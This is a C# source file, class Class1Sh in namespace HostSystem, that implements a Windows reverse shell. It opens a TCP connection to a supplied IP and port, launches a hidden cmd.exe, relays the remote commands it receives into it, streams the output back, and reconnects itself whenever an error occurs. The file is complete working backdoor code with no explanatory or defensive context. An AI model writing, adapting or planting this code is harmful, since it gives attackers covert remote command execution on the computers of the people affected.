using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;


namespace HostSystem
{
	internal class Class1Sh
	{
		static StreamWriter streamWriter;

		

		public string Cod(string ip, int porta)
		{
			
			
				TcpClient client = new TcpClient();
			try
			{

				client.Connect(ip, porta);
				Console.WriteLine(ip, porta);

				using (Stream stream = client.GetStream())
				{
					using (StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while (true)
						{

							try
							{
								strInput.Append(rdr.ReadLine());
								//strInput.Append("\n");
								p.StandardInput.WriteLine(strInput);
								strInput.Remove(0, strInput.Length);
							}
							catch (Exception)
							{
								Cod(ip, porta);
								Console.WriteLine("reconectando");
								Console.ReadLine();

							}

						}
					}
					
				}

				

			}
			catch(Exception)
            {
				Cod(ip, porta);
				
			}
			return Convert.ToString(client);









		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			StringBuilder strOutput = new StringBuilder();

			if (!String.IsNullOrEmpty(outLine.Data))
			{
				try
				{
					strOutput.Append(outLine.Data);
					streamWriter.WriteLine(strOutput);
					streamWriter.Flush();
				}
				catch (Exception err) { }
			}
		}

	}
  
}
